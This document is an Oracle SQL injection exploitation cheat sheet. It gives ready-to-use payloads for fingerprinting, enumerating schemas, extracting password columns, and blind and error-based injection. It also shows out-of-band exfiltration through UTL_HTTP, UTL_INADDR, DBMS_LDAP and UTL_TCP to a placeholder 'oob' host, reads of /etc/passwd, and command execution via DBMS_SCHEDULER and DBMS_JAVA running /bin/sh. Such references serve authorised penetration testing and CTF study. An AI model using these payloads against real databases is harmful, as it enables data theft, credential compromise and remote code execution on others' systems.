# Oracle — full exploitation reference

Oracle differs structurally: every SELECT needs `FROM` (`dual` is
the dummy table), there are no stacked queries through most drivers,
`||` concat, `rownum`/`OFFSET..FETCH` instead of LIMIT, and its real
attack surface is UTL_* network functions + Java/DBMS_SCHEDULER.

---

## 1. Fingerprint

```sql
' UNION SELECT banner,NULL FROM v$version-- -
' UNION SELECT NULL,banner FROM v$version WHERE rownum=1-- -
' UNION SELECT user,NULL FROM dual-- -
' UNION SELECT global_name,NULL FROM global_name-- -
' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME'),NULL FROM dual-- -
' UNION SELECT SYS_CONTEXT('USERENV','CURRENT_USER'),NULL FROM dual-- -
' UNION SELECT SYS_CONTEXT('USERENV','HOST'),NULL FROM dual-- -
' UNION SELECT SYS_CONTEXT('USERENV','OS_USER'),NULL FROM dual-- -
' UNION SELECT SYS_CONTEXT('USERENV','INSTANCE_NAME'),NULL FROM dual-- -
' UNION SELECT SYS.DBMS_XGEN.VERSION(),NULL FROM dual-- -    -- verbose
```

Banner shapes: `Oracle Database 11g Enterprise Edition
Release 11.2.0.1.0 - 64bit Production`, `Oracle Database 19c ...`,
`Oracle Database XE ...` — 'XE' = free edition, weaker default ACLs.

Oracle-only tells: `FROM dual`, `v$version`, `UTL_*`, `CTXSYS`,
`ORA-` errors, `rownum`, `||` concat, `nvl()`, `to_char()`,
`listagg`, `DBMS_*` packages.

---

## 2. Catalog map

```sql
-- schemas/users (Oracle "user" == "schema")
SELECT username FROM all_users;
SELECT username,account_status FROM dba_users;          -- needs priv

-- tables you can see
SELECT owner,table_name FROM all_tables;
SELECT table_name FROM user_tables;                     -- own schema
SELECT table_name FROM all_tables WHERE owner='APP';

-- columns
SELECT column_name,data_type FROM all_tab_columns
  WHERE table_name='USERS' AND owner='APP';
SELECT column_name FROM user_tab_columns WHERE table_name='USERS';

-- the works for one owner
SELECT table_name,column_name FROM all_tab_columns
  WHERE owner='APP' ORDER BY table_name,column_id;

-- views
SELECT view_name,text FROM all_views WHERE owner='APP';

-- procedures/functions (Java + PL/SQL bodies = logic + creds)
SELECT name,type FROM all_source WHERE owner='APP'
  AND type IN ('PROCEDURE','FUNCTION','PACKAGE BODY');
SELECT name,text FROM all_source WHERE owner='APP' AND line<5;

-- privileges
SELECT privilege FROM session_privs;                    -- yours now
SELECT grantee,privilege FROM user_tab_privs;
SELECT granted_role FROM user_role_privs;               -- roles held
SELECT username,privilege,admin_option FROM dba_sys_privs
  WHERE grantee=USER;                                   -- needs priv

-- links
SELECT db_link,username,host FROM all_db_links;         -- pivot map
SELECT db_link,username,host FROM dba_db_links;         -- w/ owner

-- sequences/synonyms
SELECT sequence_name FROM all_sequences;
SELECT synonym_name,table_name FROM all_synonyms;
```

Case: unquoted identifiers fold UPPERCASE — `table_name='USERS'`
not `'users'` (quoted names preserved).

---

## 3. UNION extraction recipes

Always `FROM dual` for scalar selects; always enough columns:

```sql
' UNION SELECT NULL FROM dual-- -                        -- count=1
' UNION SELECT NULL,NULL FROM dual-- -
' UNION SELECT NULL,NULL,NULL FROM dual-- -

' UNION SELECT NULL,banner,NULL FROM v$version-- -
' UNION SELECT NULL,user,NULL FROM dual-- -
' UNION SELECT NULL,global_name,NULL FROM global_name-- -

' UNION SELECT NULL,table_name,NULL FROM all_tables
   WHERE rownum=1-- -
' UNION SELECT NULL,table_name,NULL FROM all_tables
   WHERE table_name NOT IN (SELECT table_name FROM all_tables
   WHERE rownum<=5) AND rownum=1-- -                     -- paging, dumb way
' UNION SELECT NULL,table_name,NULL FROM (SELECT table_name,
   rownum r FROM all_tables) WHERE r=5-- -               -- paging, right way
' UNION SELECT NULL,table_name,NULL FROM all_tables
   ORDER BY table_name OFFSET 5 ROWS FETCH NEXT 1 ROWS ONLY-- -  -- 12c+

-- columns
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns
   WHERE table_name='USERS' AND owner='APP' AND rownum=1-- -

-- rows
' UNION SELECT NULL,username||':'||password,NULL FROM users
   WHERE rownum=1-- -

-- listagg dump (11g+)
' UNION SELECT NULL,listagg(table_name,',')
   within group (order by table_name),NULL FROM all_tables-- -
' UNION SELECT NULL,xmlagg(xmlelement(e,table_name||','))
   .extract('//text()'),NULL FROM all_tables-- -          -- pre-11g agg
' UNION SELECT NULL,rtrim(xmlagg(xmlelement(e,table_name||','))
   .extract('//text()').getclobval(),','),NULL FROM all_tables-- -
```

Concat: `||` only; `concat(a,b)` exists but takes exactly TWO args
(nest it). `chr(39)`/`chr(124)` for quote/pipe bytes. `nvl(x,'')`
for NULLs.

---

## 4. Error-based recipes

```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version
   WHERE rownum=1))-- -
' AND 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH(1,(SELECT user FROM dual)
   ,user)-- -
' AND 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH(1,(SELECT banner
   FROM v$version WHERE rownum=1),user)-- -
' AND 1=(SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))
   FROM dual)-- -
' AND 1=TO_NUMBER((SELECT user FROM dual))-- -
' AND 1=(SELECT DBMS_XGEN.VERSION() FROM dual)-- -      -- verbose
' AND 1=(SELECT CTXSYS.CTX_REPORT.TOKEN_TYPE('x',
   (SELECT user FROM dual)) FROM dual)-- -
```

`UTL_INADDR.GET_HOST_NAME`/`GET_HOST_ADDRESS` doubles as OOB.

---

## 5. Blind recipes

```sql
-- boolean (wrap in SELECT FROM dual when scalar context needs it)
' AND (SELECT 1 FROM dual WHERE LENGTH(user)>4)=1-- -
' AND (SELECT 1 FROM dual WHERE
   ASCII(SUBSTR(user,1,1))>77)=1-- -
' AND (SELECT COUNT(*) FROM all_tables)>100-- -

-- row extraction
' AND (SELECT 1 FROM dual WHERE ASCII(SUBSTR(
   (SELECT username FROM all_users WHERE rownum=1),1,1))>77)=1-- -

-- time — no SLEEP; options:
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)-- -               -- needs priv
' AND (SELECT COUNT(*) FROM all_users a,all_users b,all_users c,
   all_tables d)>0-- -                                      -- CPU
' AND UTL_INADDR.GET_HOST_ADDRESS('zzzz.invalid') IS NULL-- - -- DNS timeout
```

`DBMS_LOCK.SLEEP(5)` exists but requires EXECUTE on DBMS_LOCK
(usually DBA-only); `DBMS_PIPE.RECEIVE_MESSAGE(name,seconds)` is
the more permissive sleep.

---

## 6. OOB — UTL_* network functions

```sql
-- DNS (most permissive)
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('u.oob') FROM dual-- -
' UNION SELECT UTL_INADDR.GET_HOST_NAME('10.0.0.1') FROM dual-- -

-- HTTP carrying data
' UNION SELECT UTL_HTTP.REQUEST('http://oob/'||user) FROM dual-- -
' UNION SELECT UTL_HTTP.REQUEST('http://oob/'||
   REPLACE(user,' ','_')) FROM dual-- -
' UNION SELECT UTL_HTTP.REQUEST('http://oob/'||
   (SELECT table_name FROM all_tables WHERE rownum=1)) FROM dual-- -

-- HTTPURITYPE
' UNION SELECT HTTPURITYPE('http://oob/'||user).getclob() FROM dual-- -

-- LDAP
' AND (SELECT DBMS_LDAP.INIT('oob',389) FROM dual) IS NOT NULL-- -

-- UTL_TCP raw socket (needs ACL grant)
' AND (SELECT UTL_TCP.OPEN_CONNECTION('oob',80,10) FROM dual)
   IS NOT NULL-- -
```

ACL denials (`ORA-24247`) on 11g+ mean ACL_APEX-style policies —
older XE/10g installs usually allow all.

---

## 7. File read/write

```sql
-- directory objects + UTL_FILE (needs grants):
DECLARE f UTL_FILE.FILE_TYPE;
BEGIN f:=UTL_FILE.FOPEN('DATADIR','file.txt','R'); ... END;

-- in injection (needs PL/SQL exec — stacked/anon block via
-- callable statement, rare in CTF; try EXECUTE IMMEDIATE where
-- drivers allow):
' EXECUTE IMMEDIATE 'DECLARE f UTL_FILE.FILE_TYPE; BEGIN ... END;'-- -

-- external tables (CREATE TABLE grants):
CREATE TABLE x(c VARCHAR2(4000)) ORGANIZATION EXTERNAL
 (TYPE ORACLE_LOADER DEFAULT DIRECTORY d LOCATION('f.txt'));

-- DBMS_LOB reads BFILE (needs directory object):
SELECT DBMS_LOB.SUBSTR(BFILENAME('DIR','/etc/passwd'),4000,1)
  FROM dual;
```

Plainest usable read on an app that lets you stack PL/SQL — rare;
otherwise catalog tables + Java are the Oracle way.

---

## 8. RCE paths

1. **Java stored procedure** — `DBMS_JAVA`/`CREATE JAVA` (needs
   `JAVA ADMIN` / `create procedure` + `external` grants):

   ```sql
   -- anon block variant drivers accept:
   BEGIN DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper
      /bin/sh -c id>/tmp/x'); END;
   ```

2. **DBMS_SCHEDULER** — external job (needs `CREATE JOB` +
   `CREATE EXTERNAL JOB`):

   ```sql
   BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'j',
     job_type=>'EXECUTABLE',
     job_action=>'/bin/sh',
     job_arguments=>'-c "id>/tmp/x"',
     enabled=>TRUE,auto_drop=>TRUE); END;
   ```

3. **UTL_HTTP + internal endpoint** — hit an internal admin
   page/management console rather than the OS.

4. **DBMS_XMLQUERY / DBMS_XMLSAVE** — run arbitrary DML:

   ```sql
   SELECT DBMS_XMLQUERY.GETXML('select 1 from dual') FROM dual;
   SELECT DBMS_XMLSAVE.INSERTXML(ctx,'<ROWSET><ROW><X>v</X></ROW>
     </ROWSET>') FROM dual;
   ```

5. **`SYS.KUPP$PROC.CREATE_MASTER_PROCESS`** — data-pump engine
   abuse, spawns OS process on some builds.
6. **`SYS.LT` (Oracle Workspace Manager) / `MDSYS`** — privilege
   escalation chains via vulnerable public procs (version-specific;
   check `all_source` for invoker-rights procs).

---

## 9. Privilege checks

```sql
SELECT privilege FROM session_privs;              -- your privs now
SELECT granted_role FROM user_role_privs;
SELECT * FROM session_roles;

-- DBA?
SELECT count(*) FROM session_privs WHERE privilege='DBA';
SELECT granted_role FROM user_role_privs
  WHERE granted_role IN ('DBA','RESOURCE','CONNECT');

-- file grants
SELECT table_name,privilege FROM user_tab_privs
  WHERE table_name IN ('UTL_FILE','UTL_HTTP','DBMS_SCHEDULER');
SELECT grantee FROM dba_tab_privs WHERE table_name='UTL_HTTP'
  AND grantee=USER;
```

---

## 10. Quirks

- `FROM dual` required for scalar selects — forget it and every
  UNION errors.
- `||` concat; `concat(a,b)` 2-arg only.
- `rownum` is assigned BEFORE order-by — paging needs the
  subselect wrap (`SELECT ...,rownum r ... WHERE r=N`).
- `--` comments need the trailing space; `/* */` fine.
- `chr(39)` dodges quote filters.
- `nvl`,`nvl2`,`decode`,`case` — NULL handling.
- `substr` (not `substring`), `instr`, `length`.
- `dump(x)` — dumps bytes/charset info (handy for hex checks).
- `xmltype`/`extractvalue`/`xmltable` — XML echo tricks:
  `EXTRACTVALUE(xmltype('<%26>'||user),'/x')` in errors.
- Dates need `TO_DATE`/`TO_TIMESTAMP` — comparing a string to a
  DATE column errors differently — watch for that as a detection
  quirk.
- `v$`/`dba_` views need rights; `all_`/`user_` always readable.
- `SYS_CONTEXT('USERENV',x)` is a goldmine: IP_ADDRESS,
  TERMINAL, MODULE, AUTHENTICATED_IDENTITY, CLIENT_INFO, HOST —
  often leaks the app-server host names.

---

## 11. Quick diagnosis table

| Need | Statement |
|---|---|
| who am I | `user`, `SYS_CONTEXT('USERENV','CURRENT_USER')` |
| where am I | `global_name`, `SYS_CONTEXT(...,'DB_NAME')` |
| list tables | `all_tables` / `user_tables` |
| list columns | `all_tab_columns` / `user_tab_columns` |
| read file | `UTL_FILE`/`BFILE` (needs directory grant) |
| write file | `UTL_FILE` / external tables |
| OOB | `UTL_INADDR` > `UTL_HTTP` > `DBMS_LDAP` |
| RCE | `DBMS_SCHEDULER` / Java stored proc |
| sleep | `DBMS_PIPE.RECEIVE_MESSAGE('x',n)` / `DBMS_LOCK.SLEEP` |
| error echo | `CTXSYS.DRITHSX.SN` / `TO_NUMBER(x)` |
| dump rows | `listagg` / `xmlagg`+`getclobval` |
| privilege | `session_privs`, `user_role_privs` |
